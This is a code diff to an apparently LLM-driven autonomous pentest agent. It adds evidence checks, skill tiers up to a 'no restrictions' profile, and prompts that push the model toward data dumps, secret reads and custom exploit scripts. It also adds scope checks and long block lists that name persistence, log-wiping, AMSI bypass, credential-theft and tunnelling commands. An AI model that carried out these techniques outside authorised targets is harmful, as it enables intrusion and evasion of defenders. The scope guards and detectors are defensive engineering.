-        """Require explicit evidence markers for vulnerability memories."""
+        """Require concrete evidence for vulnerability memories.
+
+        This is intentionally strict: false positives in the vuln tracker are worse than
+        missing a model-emitted memory, because we can still auto-track vulns from
+        real command outputs.
+        """
         if category != "vulnerability_found":
             return True
-        lowered = (content or "").lower()
-        markers = ("evidence:", "proof:", "poc:", "repro:")
-        if any(m in lowered for m in markers):
-            return True
-        # Accept implicit evidence when it includes strong, concrete indicators.
-        # This prevents the run from losing real vulns due to formatting omissions ("Evidence:" token).
+        text = (content or "").strip()
+        if not text:
+            return False
+        lowered = text.lower()
+
         import re
-        if re.search(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', content or ""):
+
+        # Strip code blocks to detect "planning-only" memories like:
+        # "Exploiting X to get proof: ```bash ...```" (no output evidence).
+        non_code = re.sub(r"```.*?```", "", text, flags=re.S).strip()
+        non_code_lower = non_code.lower()
+
+        # Strong, concrete indicators (allow even without "Evidence:" marker).
+        if re.search(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', text):
             return True
         strong = ("root:x:", "uid=", "gid=", "http/1.1 200", "http/2 200")
         if any(s in lowered for s in strong):
             return True
+
+        # Negative signal: "not found" responses are not vuln evidence.
+        # (Allow was already handled above via strong markers/JWT.)
+        if any(bad in lowered for bad in ("404 - file or directory not found", "<title>404", " 404 ", "not found")):
+            return False
+
+        markers = ("evidence:", "proof:", "poc:", "repro:")
+        has_marker = any(m in lowered for m in markers) or any(m in non_code_lower for m in markers)
+        if has_marker:
+            # Reject "plan-to-get-proof" phrasing unless we also have strong indicators (handled above).
+            if re.search(r"\b(to\s+(get|obtain|capture|collect)\s+(proof|evidence)|to\s+prove)\b", lowered):
+                return False
+            # Require at least some concrete result language OUTSIDE code blocks.
+            result_words = (
+                "returned", "response:", "output:", "stdout:", "status:",
+                "bypass", "token", "dump", "dumped", "extracted", "leaked", "leak",
+                "error:", "stack trace", "traceback", "unauthorized", "forbidden",
+            )
+            if any(w in non_code_lower for w in result_words):
+                return True
+            # Also allow if injection indicators plus result language appear anywhere (e.g. "token returned").
+            inj = ("' or", "or 1=1", "union", "sleep(", "benchmark(", "--", "%27")
+            if any(i in lowered for i in inj) and any(w in lowered for w in ("returned", "bypass", "token", "dump", "extracted", "leak")):
+                return True
+            return False
+
+        # Accept implicit evidence when it includes strong, concrete indicators.
+        # This prevents the run from losing real vulns due to formatting omissions ("Evidence:" token).
         inj = ("' or", "or 1=1", "union", "sleep(", "benchmark(", "--", "%27")
         if any(i in lowered for i in inj) and ("returned" in lowered or "bypass" in lowered or "token" in lowered):
             return True
@@ -2118,7 +2671,10 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         if self.allowed_targets_set:
             lines.append(f"- In-scope targets: {', '.join(sorted(self.allowed_targets_set))}")
             if len(self.allowed_targets_set) > 1:
-                lines.append("- Multi-target engagement: rotate across in-scope targets. After baseline recon + one exploit attempt, pivot to the next target.")
+                lines.append(
+                    "- Multi-target engagement: rotate across in-scope targets. For EACH target: baseline recon → find 1 high-confidence vuln → exploit with PROOF → "
+                    "perform 2 post-exploit deepening actions (data dump / secrets read / credential validation) → then pivot."
+                )
         lines.append(f"- Scope expansion: {'allowed' if self.allow_scope_expansion else 'disabled'}")
         lines.append(f"- Persistence actions: {'allowed' if self.allow_persistence else 'disabled'}")
         lines.append(f"- Defense evasion/cleanup: {'allowed' if self.allow_defense_evasion else 'disabled'}")
@@ -2290,13 +2846,66 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         if not skills_dir:
             return
 
+        # ── Profile-aware skill parameters ──────────────────────────
+        # Determine model tier from LLM profile (affects skill depth & count)
+        profile_name = os.environ.get("LLM_PROFILE", "").lower() or "balanced"
+        skill_tier = os.environ.get("SKILL_TIER", "").lower()  # manual override
+        if not skill_tier:
+            # Map profile → skill tier
+            tier_map = {
+                "strict": "basic",       # Step-by-step, prescriptive commands only
+                "balanced": "standard",   # Standard techniques + some decision trees
+                "relaxed": "advanced",    # Full decision trees, chaining, advanced refs
+                "unleashed": "advanced",  # Same depth, more freedom
+                "unhinged": "advanced",   # Same depth, no restrictions
+            }
+            skill_tier = tier_map.get(profile_name, "standard")
+
+        # Skill loading parameters by tier
+        tier_config = {
+            "basic": {
+                "max_skills": 2 if phase != "FULL" else 4,
+                "max_chars": 1000,       # Shorter prompts for weaker models
+                "load_advanced_refs": False,
+                "skill_guidance": (
+                    "\n[SKILL TIER: BASIC] Follow commands exactly as shown. "
+                    "Do NOT improvise or chain techniques. Execute one step at a time. "
+                    "If a command fails, report the error and try the next listed alternative."
+                ),
+            },
+            "standard": {
+                "max_skills": 4 if phase == "POST_EXPLOIT" else 3,
+                "max_chars": 1500,
+                "load_advanced_refs": False,
+                "skill_guidance": (
+                    "\n[SKILL TIER: STANDARD] Follow the methodology but use judgment on technique selection. "
+                    "You may adapt commands to the target environment. Use decision trees when provided."
+                ),
+            },
+            "advanced": {
+                "max_skills": 6 if phase == "POST_EXPLOIT" else 4,
+                "max_chars": 2500,       # More room for advanced content
+                "load_advanced_refs": True,
+                "skill_guidance": (
+                    "\n[SKILL TIER: ADVANCED] You have full access to advanced techniques, "
+                    "exploit chains, and bypass methods. Use OPSEC ratings (🟢🟡🔴) to choose "
+                    "appropriate noise levels. Chain techniques when opportunities arise. "
+                    "Consult failure recovery guides when standard approaches fail."
+                ),
+            },
+        }
+        tc = tier_config.get(skill_tier, tier_config["standard"])
+        max_skills = tc["max_skills"]
+
+        # Expand for persistence/evasion regardless of tier
+        if phase == "POST_EXPLOIT" and (self.allow_persistence or self.allow_defense_evasion):
+            max_skills = max(max_skills, 8)
+        # ────────────────────────────────────────────────────────────
+
         loader = SkillLoader(skills_dir)
         router = SkillRouter()
         evidence = self._load_evidence_context()
         service_hints = self._infer_service_hints()
-        max_skills = 4 if phase == "POST_EXPLOIT" else 3
-        if phase == "POST_EXPLOIT" and (self.allow_persistence or self.allow_defense_evasion):
-            max_skills = 8
         selection = router.select(
             loader.get_all_skills(),
             phase=phase,
@@ -2308,17 +2917,53 @@ Vary your techniques. Do not repeat failed commands. Make progress.
 
         policy = self._build_policy_prompt(phase, target_type, exploit_mode)
         plan = router.format_plan(selection)
-        skills_prompt = loader.format_skills_for_prompt(selection.skills, max_chars=1500)
+        skills_prompt = loader.format_skills_for_prompt(selection.skills, max_chars=tc["max_chars"])
+
+        # ── Load advanced references for capable models ─────────────
+        advanced_refs_prompt = ""
+        if tc["load_advanced_refs"] and selection.skills:
+            refs_loaded = []
+            refs_budget = 3000  # chars budget for advanced refs
+            for skill in selection.skills:
+                skill_dir = os.path.join(skills_dir, skill.id, "references")
+                if not os.path.isdir(skill_dir):
+                    continue
+                for ref_name in ["advanced_techniques.md", "exploit_chains.md",
+                                 "advanced_privesc.md", "advanced_recon.md",
+                                 "advanced_credential_attacks.md", "credential_chains.md",
+                                 "recon_to_attack_routing.md", "opsec_ratings.md",
+                                 "failure_recovery.md", "privesc_chains.md"]:
+                    ref_path = os.path.join(skill_dir, ref_name)
+                    if os.path.isfile(ref_path):
+                        try:
+                            with open(ref_path, 'r') as f:
+                                content = f.read(refs_budget)
+                            if content:
+                                refs_loaded.append(f"### {skill.id}/{ref_name}\n{content}")
+                                refs_budget -= len(content)
+                                if refs_budget <= 0:
+                                    break
+                        except Exception:
+                            pass
+                if refs_budget <= 0:
+                    break
+            if refs_loaded:
+                advanced_refs_prompt = "\n\n# Advanced Techniques (Senior Level)\n" + "\n\n".join(refs_loaded)
+        # ────────────────────────────────────────────────────────────
 
         selected_ids = [s.id for s in selection.skills]
         self._log(
-            f"Skill router: phase={phase} target_type={target_type} "
+            f"Skill router: phase={phase} target_type={target_type} tier={skill_tier} "
+            f"profile={profile_name} max_skills={max_skills} "
             f"service_hints={service_hints} selected={selected_ids}"
         )
 
         self.conversation[0]["content"] += "\n\n" + policy + "\n\n" + plan
+        self.conversation[0]["content"] += tc["skill_guidance"]
         if skills_prompt:
             self.conversation[0]["content"] += "\n\n" + skills_prompt
+        if advanced_refs_prompt:
+            self.conversation[0]["content"] += advanced_refs_prompt
     
     def _extract_executable(self, response: str) -> List[Tuple[str, str]]:
         """
@@ -2390,12 +3035,54 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         return executables
     
     def _detect_tool(self, content: str) -> str:
-        """Detect which tool is being used - no hardcoded list, just pattern matching"""
-        first_word = content.split()[0] if content.split() else "unknown"
-        # Remove path if present
-        if '/' in first_word:
-            first_word = first_word.split('/')[-1]
-        return first_word
+        """Detect which tool is being used (best-effort; metrics/UX only).
+
+        Handles shell prelude patterns like:
+        - `TOKEN=$(curl ...) && ...`
+        - `JWT="..." ; curl ...`
+        by returning the first recognizable tool in the line.
+        """
+        text = (content or "").strip()
+        if not text:
+            return "unknown"
+
+        # Prefer a known tool match anywhere in the command so variable assignments don't
+        # pollute the tool name (e.g., "JWT=...").
+        try:
+            tool_re = re.compile(
+                r"(?:(?<=^)|(?<=[\\s;|&()]))"
+                r"(sqlmap|curl|nmap|masscan|nikto|gobuster|ffuf|feroxbuster|dirb|dirsearch|whatweb|nuclei|"
+                r"searchsploit|msfconsole|msfvenom|python3|python|bash|sh|nc|netcat|sshpass|ssh|hydra|"
+                r"crackmapexec|smbclient|psql|mysql|redis-cli)"
+                r"(?=$|[\\s\"'`])",
+                re.IGNORECASE,
+            )
+            m = tool_re.search(text)
+            if m:
+                return (m.group(1) or "").lower()
+        except Exception:
+            pass
+
+        # Fallback: return first non-assignment token.
+        try:
+            assign_re = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+            tokens = text.split()
+            for tok in tokens:
+                t = tok.strip().strip(";")
+                if not t or t in ("&&", "||", "|", ";"):
+                    continue
+                if t in ("export", "env"):
+                    continue
+                if assign_re.match(t):
+                    continue
+                # Remove path if present
+                if "/" in t:
+                    t = t.split("/")[-1]
+                return t
+        except Exception:
+            pass
+
+        return "unknown"
     
     def _is_off_target(self, content: str) -> Optional[str]:
         """
@@ -2413,6 +3100,13 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         target_variants = {t for t in (target_host, self.target) if t}
         allowed = set(self.allowed_targets_set) if self.allowed_targets_set else set(self.allowed_targets)
         allowed.update(target_variants)
+        # Treat known aliases as in-scope (e.g., juiceshop <-> 172.21.0.x).
+        try:
+            if getattr(self, "target_aliases", None):
+                allowed.update(self.target_aliases.keys())
+                allowed.update(self.target_aliases.values())
+        except Exception:
+            pass
         
         # Scanning tools that take target arguments
         scan_tools = [
@@ -2463,16 +3157,51 @@ Vary your techniques. Do not repeat failed commands. Make progress.
 
         # Block any direct IP/hostname access that isn't in the allowlist
         command_targets = self._extract_targets_from_command(content)
+        # Normalize extracted targets and collapse aliases so `juiceshop` + its IP doesn't look like 2 targets.
+        try:
+            norm_targets = set()
+            for t in (command_targets or set()):
+                nt = self._normalize_target_token(str(t))
+                if nt:
+                    norm_targets.add(nt)
+            command_targets = norm_targets
+        except Exception:
+            pass
+
         if command_targets and len(command_targets) > 1 and not self.allow_multi_target_scan:
-            return "⚠️ OFF-TARGET: Multiple targets in one command are not allowed. Run one target per command."
-        for tgt in command_targets:
+            canonical = set()
+            try:
+                for t in command_targets:
+                    if getattr(self, "target_aliases", None) and t in self.target_aliases:
+                        canonical.add(self.target_aliases[t])
+                    else:
+                        canonical.add(t)
+            except Exception:
+                canonical = set(command_targets)
+            if len(canonical) > 1:
+                return "⚠️ OFF-TARGET: Multiple targets in one command are not allowed. Run one target per command."
+
+        for tgt in (command_targets or set()):
+            # Resolve alias -> canonical for scope checks
+            canonical_tgt = None
+            try:
+                canonical_tgt = self.target_aliases.get(tgt) if getattr(self, "target_aliases", None) else None
+            except Exception:
+                canonical_tgt = None
             if tgt in allowed or tgt in localhost_patterns:
+                continue
+            if canonical_tgt and canonical_tgt in allowed:
                 continue
             if self.allow_scope_expansion:
                 try:
                     if ipaddress.ip_address(tgt).is_private:
                         # Only allow private pivots if we explicitly discovered/aliased them.
-                        if (not self.strict_scope_expansion) or (tgt in self.discovered_targets) or (tgt in allowed):
+                        if (
+                            (not self.strict_scope_expansion)
+                            or (tgt in self.discovered_targets)
+                            or (tgt in allowed)
+                            or (canonical_tgt and canonical_tgt in allowed)
+                        ):
                             continue
                 except Exception:
                     pass
@@ -2514,11 +3243,31 @@ Vary your techniques. Do not repeat failed commands. Make progress.
             return None
         lowered = (content or "").lower()
         indicators = [
+            # --- Linux persistence ---
             "crontab", "cron.", "/etc/cron", "systemctl enable", "systemctl start",
+            "rc.local", "init.d", "launchctl", "at now", "at -f",
+            "authorized_keys", "ssh-keygen", "ssh-copy-id",
+            "/etc/ld.so.preload", "ld_preload",
+            "/etc/pam.d/", "pam_unix", "pam_exec",
+            ".bashrc", ".bash_profile", ".profile", "/etc/profile.d/",
+            "systemd/system/", ".service", ".timer",
+            "insmod", "modprobe", "/lib/modules",
+            # --- Windows persistence ---
             "schtasks /create", "schtasks.exe /create", "reg add", "reg.exe add",
-            "sc create", "service create", "launchctl", "rc.local", "init.d",
-            "authorized_keys", "useradd", "adduser", "net user", "net localgroup",
-            "wmic", "wmi", "startup", "runonce", "run key", "winlogon", "lsass provider"
+            "sc create", "service create", "new-service",
+            "startup", "runonce", "run key", "winlogon", "lsass provider",
+            "currentversion\\run", "currentversion\\runonce",
+            "wmic process call create", "wmi event", "eventtrigger",
+            "__eventconsumer", "__eventfilter", "__filtertoconsumerbinding",
+            "new-scheduledtask", "register-scheduledjob",
+            "dll hijack", "dll search order", "phantom dll",
+            "com hijack", "inprocserver32",
+            # --- Account creation ---
+            "useradd", "adduser", "net user", "net localgroup",
+            "new-localuser", "new-aduser",
+            # --- Web persistence ---
+            "<?php", "<%@", "system($_", "cmd.exe /c", "webshell",
+            "weevely", "create trigger", "xp_cmdshell",
         ]
         if any(ind in lowered for ind in indicators):
             return "⚠️ POLICY: Persistence actions are disabled for this job."
@@ -2530,11 +3279,61 @@ Vary your techniques. Do not repeat failed commands. Make progress.
             return None
         lowered = (content or "").lower()
         indicators = [
+            # --- Log manipulation (Linux) ---
             "wevtutil cl", "clear-eventlog", "clear eventlog", "auditctl -e 0",
             "rm -rf /var/log", "truncate -s 0 /var/log", ">/var/log",
             "logrotate", "journalctl --vacuum", "setenforce 0",
-            "stop-service", "systemctl stop", "kill -9", "pkill", "taskkill /f",
-            "del /f /q", "rm -f ~/.bash_history", "history -c"
+            "rm -f ~/.bash_history", "history -c", "unset histfile",
+            "set +o history", "histfile=/dev/null",
+            "shred -zu", "shred -zun", "srm ",
+            "/var/log/auth", "/var/log/syslog", "/var/log/messages",
+            "utmpdump", "/var/run/utmp", "/var/log/wtmp", "/var/log/btmp",
+            "dmesg -c", "dmesg -C", "echo > /dev/kmsg",
+            # --- Log manipulation (Windows) ---
+            "wevtutil el", "wevtutil qe", "clear-winevents",
+            "remove-eventlog", "auditpol /set", "auditpol /clear",
+            "invoke-phant0m", "event::drop", "event::clear",
+            # --- Timestomping ---
+            "touch -t ", "touch -r ", "touch -d ",
+            "timestomp", ".lastwritetime", ".creationtime", ".lastaccesstime",
+            "set-itemproperty.*time", "debugfs -w",
+            # --- Process manipulation ---
+            "kill -9", "pkill", "taskkill /f",
+            "stop-service", "systemctl stop",
+            "migrate ", "inject ", "process hollowing",
+            "dllinjection", "reflective", "createremotethread",
+            "ntwritevirtualmemory", "queueuserapc",
+            # --- AV/EDR evasion ---
+            "amsiutils", "amsiinitfailed", "amsiscanbuffer",
+            "etweventwrite", "etw patch", "etw bypass",
+            "disable-windowsoptionalfeature.*defender",
+            "set-mppreference.*disablerealtimemonitoring",
+            "sc stop windefend", "sc delete windefend",
+            "unload sysmon", "fltmc unload",
+            # --- Payload obfuscation ---
+            "veil", "shellter", "msfvenom",
+            "shikata_ga_nai", "upx --best",
+            # --- Token / credential evasion ---
+            "steal_token", "incognito", "impersonate_token",
+            "sekurlsa::pth", "kerberos::golden", "kerberos::ptt",
+            "misc::skeleton", "sid::add",
+            "pth-winexe", "pass-the-hash", "pass.the.ticket",
+            # --- Artifact cleanup ---
+            "del /f /q", "rm -f ~/.", "remove-item.*zone.identifier",
+            "clear-recyclebin", "cipher /w:",
+            # --- Indirect execution / LOLBins ---
+            "forfiles /p", "pcalua.exe", "scriptrunner",
+            "wmic os get /format:", "msxsl.exe",
+            # --- Sandbox / anti-debug ---
+            "isdebuggerPresent", "ptrace(ptrace_traceme",
+            "systemd-detect-virt", "anti-sandbox",
+            # --- Network evasion ---
+            "dnscat", "iodine", "ptunnel",
+            "dns tunnel", "icmp tunnel",
+            # --- Trust subversion ---
+            "gatekeeper", "spctl --master-disable",
+            "xattr -d com.apple.quarantine",
+            "certutil -addstore root",
         ]
         if any(ind in lowered for ind in indicators):
             return "⚠️ POLICY: Defense evasion/cleanup actions are disabled for this job."
@@ -2657,7 +3456,11 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         if tool_used == "sqlmap" or (content and content.strip().startswith("sqlmap")):
             content = self._sanitize_sqlmap_command(content)
 
-        self._log(f"Executing [{exec_type}]: {content[:100]}...")
+        try:
+            preview = self._redact_sensitive((content or "")[:400])
+        except Exception:
+            preview = (content or "")[:400]
+        self._log(f"Executing [{exec_type}]: {preview[:100]}...")
         
         start = time.time()
         
@@ -2758,15 +3561,49 @@ Vary your techniques. Do not repeat failed commands. Make progress.
             tool = (execution.tool_used or "").lower()
             cmd_low = (execution.content or "").lower()
             if (tool == "searchsploit" or "searchsploit" in cmd_low) and execution.success and execution.stdout:
-                evidence_dir = os.path.join(self.log_dir, "evidence")
-                os.makedirs(evidence_dir, exist_ok=True)
-                exploitdb_path = os.path.join(evidence_dir, "exploitdb.txt")
-                mode = "a" if os.path.exists(exploitdb_path) else "w"
-                with open(exploitdb_path, mode) as ef:
-                    if mode == "a":
-                        ef.write("\n\n--- searchsploit (iteration {}) ---\n".format(self.iteration))
-                    ef.write(execution.stdout)
-                self._log("📁 Auto-saved searchsploit output to evidence/exploitdb.txt", "INFO")
+                # Some wrappers print HTML/cookies/etc alongside searchsploit output.
+                # Keep the evidence file clean by extracting only searchsploit-ish lines.
+                stdout_to_save = execution.stdout or ""
+                if tool != "searchsploit":
+                    try:
+                        markers = list(re.finditer(r"^---\s*searchsploit\s*---\s*$", stdout_to_save, flags=re.I | re.M))
+                        if markers:
+                            stdout_to_save = stdout_to_save[markers[-1].end():]
+                    except Exception:
+                        pass
+                stdout_to_save = stdout_to_save.strip()
+                cleaned = ""
+                try:
+                    if stdout_to_save.lstrip().startswith("{") and "RESULTS_EXPLOIT" in stdout_to_save:
+                        cleaned = stdout_to_save
+                    else:
+                        kept = []
+                        for ln in stdout_to_save.splitlines():
+                            s = (ln or "").strip()
+                            if not s:
+                                continue
+                            # searchsploit table output
+                            if "|" in ln:
+                                kept.append(ln)
+                                continue
+                            # searchsploit summaries (e.g. "Exploits: No Results")
+                            if s.startswith("Exploits:") or s.startswith("Shellcodes:"):
+                                kept.append(s)
+                                continue
+                        cleaned = "\n".join(kept).strip()
+                except Exception:
+                    cleaned = ""
+
+                if cleaned:
+                    evidence_dir = os.path.join(self.log_dir, "evidence")
+                    os.makedirs(evidence_dir, exist_ok=True)
+                    exploitdb_path = os.path.join(evidence_dir, "exploitdb.txt")
+                    mode = "a" if os.path.exists(exploitdb_path) else "w"
+                    with open(exploitdb_path, mode) as ef:
+                        if mode == "a":
+                            ef.write("\n\n--- searchsploit (iteration {}) ---\n".format(self.iteration))
+                        ef.write(cleaned)
+                    self._log("📁 Auto-saved searchsploit output to evidence/exploitdb.txt", "INFO")
         except Exception:
             pass
 
@@ -2825,10 +3662,30 @@ Vary your techniques. Do not repeat failed commands. Make progress.
                         _vrec = self.vulns_found.get(vid)
                         if isinstance(_vrec, dict) and (_vrec.get("exploited") or (_vrec.get("not_exploitable_reason") or "").strip()):
                             return
+                        # FIX: Don't prove a vuln in the same iteration it was discovered.
+                        # The auto-tracker and proof check would use the same execution output,
+                        # causing instant false-positive proofs. Require a SEPARATE exploit attempt.
+                        vuln_iter_found = int((_vrec or {}).get("iteration_found") or 0)
+                        _prechecked_ok = None
+                        _prechecked_proof = ""
+                        if vuln_iter_found == self.iteration:
+                            # Allow same-iteration proof only when it is evidence-strong (e.g., JWT token,
+                            # sqlmap DB listing, file-read). This avoids the "discover+prove instantly"
+                            # false-positive issue while not penalizing real exploit commands.
+                            _prechecked_ok, _prechecked_proof = self._proof_ok_for_vuln(_vrec or {}, execution)
+                            if not _prechecked_ok:
+                                self._log(
+                                    f"⏳ EXPLOIT DEFERRED: {vid} discovered this iteration — proof requires separate exploit attempt",
+                                    "INFO",
+                                )
+                                return
                         self._record_vuln_attempt(vid, execution)
                         self._log(f"EXPLOIT ATTEMPT recorded for {vid}", "INFO")
                         v = self.vulns_found.get(vid) or {}
-                        ok, proof = self._proof_ok_for_vuln(v, execution)
+                        if _prechecked_ok is not None:
+                            ok, proof = bool(_prechecked_ok), (_prechecked_proof or "")
+                        else:
+                            ok, proof = self._proof_ok_for_vuln(v, execution)
                         if (not self.enforce_exploit_proof) or ok:
                             self._log(f"✅ EXPLOIT PROVEN: {v.get('type','')} @ {v.get('target','')}", "INFO")
                             self._mark_vuln_proven(vid, proof or (execution.stdout or execution.stderr or ""))
@@ -2840,6 +3697,60 @@ Vary your techniques. Do not repeat failed commands. Make progress.
                                 attempt_count = int((self.vulns_found.get(vid) or {}).get("attempt_count") or 0)
                             except Exception:
                                 attempt_count = 0
+
+                            # P0 Anti-loop: after 3 failed attempts, pivot to next vuln (do not scan).
+                            if attempt_count >= self.exploit_fail_fast_threshold:
+                                # BUG FIX: Mark vuln as not_exploitable IMMEDIATELY so the
+                                # exploit gate (_get_unproven_vulns) won't re-trigger on it.
+                                # Without this, the gate keeps pushing the agent back to the
+                                # same dead-end vuln, creating an infinite loop.
+                                _ff_vrec = self.vulns_found.get(vid)
+                                if isinstance(_ff_vrec, dict) and not _ff_vrec.get("exploited") and not (_ff_vrec.get("not_exploitable_reason") or "").strip():
+                                    _ff_vrec["not_exploitable_reason"] = (
+                                        f"Fail-fast: {attempt_count} exploit attempts without proof. "
+                                        f"Marked not_exploitable to prevent exploit gate death loop."
+                                    )
+                                    self._save_vuln_tracker()
+                                    self._log(f"FAIL-FAST MARKED NOT_EXPLOITABLE: {vid} after {attempt_count} attempts", "WARN")
+
+                                next_vid = None
+                                for cand_vid, cand in self.vulns_found.items():
+                                    if cand_vid == vid or not isinstance(cand, dict):
+                                        continue
+                                    if cand.get("exploited") or (cand.get("not_exploitable_reason") or "").strip():
+                                        continue
+                                    next_vid = cand_vid
+                                    break
+                                if next_vid:
+                                    self.current_vuln_focus_id = next_vid
+                                    self.force_exploit_next = True
+                                    self.conversation.append(
+                                        {
+                                            "role": "user",
+                                            "content": (
+                                                f"⚠️ Exploit failed {attempt_count}x for {vid}. "
+                                                f"Move to NEXT vuln: {next_vid}. Do NOT return to scanning."
+                                            ),
+                                        }
+                                    )
+                                    self._log(f"FAIL-FAST PIVOT: {vid} -> {next_vid} after {attempt_count} failed attempts", "WARN")
+                                    return
+                                else:
+                                    # No next vuln to pivot to — all vulns are resolved or not_exploitable.
+                                    # Release the exploit gate to prevent death loop.
+                                    proven_count = sum(
+                                        1 for _v in self.vulns_found.values()
+                                        if isinstance(_v, dict) and (_v.get("exploited") or _v.get("proof"))
+                                    )
+                                    self.force_exploit_next = False
+                                    self.current_vuln_focus_id = None
+                                    if proven_count > 0:
+                                        self.all_vulns_resolved = True
+                                        self.exploit_only_hard = False
+                                        self._log(f"FAIL-FAST: all vulns resolved after marking {vid} not_exploitable — releasing gate", "INFO")
+                                    else:
+                                        self._log(f"FAIL-FAST: no exploitable vulns remain and 0 proven — releasing gate for recon", "WARN")
+                                    return
 
                             max_attempts = int(self.exploit_proof_max_attempts_per_vuln or 0)
                             # Check technique diversity: require >= 3 unique techniques OR 3x max_attempts
@@ -2853,12 +3764,59 @@ Vary your techniques. Do not repeat failed commands. Make progress.
                                 last_snip = last_snip[:300] if last_snip else "(no output)"
                                 if self.exploit_proof_fail_mode == "skip":
                                     vrec = self.vulns_found.get(vid)
-                                    if isinstance(vrec, dict) and not vrec.get("exploited") and not (vrec.get("not_exploitable_reason") or "").strip():
-                                        vrec["not_exploitable_reason"] = (
-                                            f"Proof not achieved after {attempt_count} exploit attempts. "
-                                            f"Last output snippet: {last_snip}"
-                                        )[:800]
+
+                                    # ── P1 Feature 4: Coder Sub-Agent (Custom Exploit Writing) ──
+                                    # Before skipping, check if we should try a custom exploit script
+                                    _coder_exploitable_types = (
+                                        "sql", "rce", "lfi", "command_injection", "command injection",
+                                        "traversal", "path traversal", "file inclusion", "ssrf", "ssti",
+                                        "xxe", "deserialization", "injection",
+                                    )
+                                    _vrec_type = str((vrec or {}).get("type", "")).lower() if isinstance(vrec, dict) else ""
+                                    _vrec_target = str((vrec or {}).get("target", "")).lower() if isinstance(vrec, dict) else ""
+                                    _custom_attempted = (vrec or {}).get("custom_exploit_attempted", False) if isinstance(vrec, dict) else True
+                                    _is_coder_candidate = any(ct in _vrec_type for ct in _coder_exploitable_types)
+
+                                    if isinstance(vrec, dict) and _is_coder_candidate and not _custom_attempted:
+                                        # Give it one more chance with a custom exploit script
+                                        vrec["custom_exploit_attempted"] = True
                                         self._save_vuln_tracker()
+                                        _techniques = vrec.get("techniques_tried", [])
+                                        coder_msg = (
+                                            f"🛠️ STANDARD TOOLS FAILED — Write a custom exploit script.\n"
+                                            f"Vulnerability: {vrec.get('type', 'unknown')} at {vrec.get('target', 'unknown')}\n"
+                                            f"Previous attempts: {attempt_count} with {_techniques}\n\n"
+                                            f"Write a Python/bash script that:\n"
+                                            f"1. Targets the specific endpoint/service\n"
+                                            f"2. Sends the exploit payload\n"
+                                            f"3. Captures and displays the output/data\n"
+                                            f"4. Save it to /pentest/output/custom_exploit_{vid}.py\n\n"
+                                            f"Then execute the script and use its output as proof."
+                                        )
+                                        self.conversation.append({"role": "user", "content": coder_msg})
+                                        self.force_exploit_next = True
+                                        self._log(
+                                            f"🛠️ CODER SUB-AGENT: custom exploit requested for {vid} "
+                                            f"(type={_vrec_type}, attempts={attempt_count})",
+                                            "INFO"
+                                        )
+                                        # Don't skip yet — give the custom exploit a chance
+                                    else:
+                                        # Original skip logic (no custom exploit possible or already attempted)
+                                        pass  # Fall through to skip below
+
+                                    # Only actually skip if custom exploit was already attempted or not applicable
+                                    if _custom_attempted or not _is_coder_candidate:
+                                        if isinstance(vrec, dict) and not vrec.get("exploited") and not (vrec.get("not_exploitable_reason") or "").strip():
+                                            vrec["not_exploitable_reason"] = (
+                                                f"Proof not achieved after {attempt_count} exploit attempts. "
+                                                f"Last output snippet: {last_snip}"
+                                            )[:800]
+                                            self._save_vuln_tracker()
+                                    else:
+                                        # Custom exploit just requested — skip the skip
+                                        return
+
                                     self._log(
                                         f"⚠️ EXPLOIT PROOF FAILED after {attempt_count} attempts; skipping {vid} (fail_mode=skip)",
                                         "WARN",
@@ -2878,17 +3836,42 @@ Vary your techniques. Do not repeat failed commands. Make progress.
                                             self.conversation.append({"role": "user", "content": pivot_msg})
                                             self._log(f"AUTO-PIVOT after exhaustion of {vid}: next={next_id}", "INFO")
                                         else:
-                                            # No more vulns to exploit — stop forcing
-                                            self.force_exploit_next = False
-                                            self.current_vuln_focus_id = None
-                                            self.all_vulns_resolved = True
-                                            self.exploit_only_hard = False
-                                            self._log("ALL VULNS RESOLVED after exhaustion — switching to recon", "INFO")
+                                            proven_count = sum(
+                                                1 for _v in self.vulns_found.values()
+                                                if isinstance(_v, dict) and (_v.get("exploited") or _v.get("proof"))
+                                            )
+                                            if proven_count > 0:
+                                                self.force_exploit_next = False
+                                                self.current_vuln_focus_id = None
+                                                self.all_vulns_resolved = True
+                                                self.exploit_only_hard = False
+                                                self._log("ALL VULNS RESOLVED after exhaustion — switching to recon", "INFO")
+                                            else:
+                                                # Never drop back to scanning when nothing has been proven.
+                                                if isinstance(vrec, dict):
+                                                    vrec["not_exploitable_reason"] = ""
+                                                    self._save_vuln_tracker()
+                                                self.force_exploit_next = True
+                                                self.current_vuln_focus_id = vid
+                                                self.all_vulns_resolved = False
+                                                self.exploit_only_hard = True
+                                                self.conversation.append(
+                                                    {
+                                                        "role": "user",
+                                                        "content": (
+                                                            f"⚠️ {attempt_count} exploit attempts failed for {vid}, "
+                                                            "and 0 vulnerabilities are proven so far.\n"
+                                                            "Do NOT return to scanning. Retry this vuln with a DIFFERENT exploit family "
+                                                            "(manual payload, custom script, alternate protocol, or credential replay)."
+                                                        ),
+                                                    }
+                                                )
+                                                self._log("NO-PROOF GUARD: kept exploitation mode active (no recon fallback)", "WARN")
                                     except Exception:
-                                        self.force_exploit_next = False
-                                        self.current_vuln_focus_id = None
-                                        self.all_vulns_resolved = True
-                                        self.exploit_only_hard = False
+                                        self.force_exploit_next = True
+                                        self.current_vuln_focus_id = vid
+                                        self.all_vulns_resolved = False
+                                        self.exploit_only_hard = True
                                 else:
                                     self.hard_stop_reason = (
                                         f"Exploit proof failed for vuln {vid} after {attempt_count} attempts "
@@ -2979,6 +3962,49 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         impossible = self._impossible_exploits.get(runtime, set())
         return any(imp in vtype_lower for imp in impossible)
 
+    def _maybe_register_target_aliases_from_output(self, cmd_lower: str, output: str) -> None:
+        """Register discovered target aliases from recon/DNS output."""
+        try:
+            if not (self.target or self.allowed_targets_set or self.allowed_targets):
+                return
+            if not any(tok in (cmd_lower or "") for tok in ("nmap", "host ", "dig ", "ping ")):
+                return
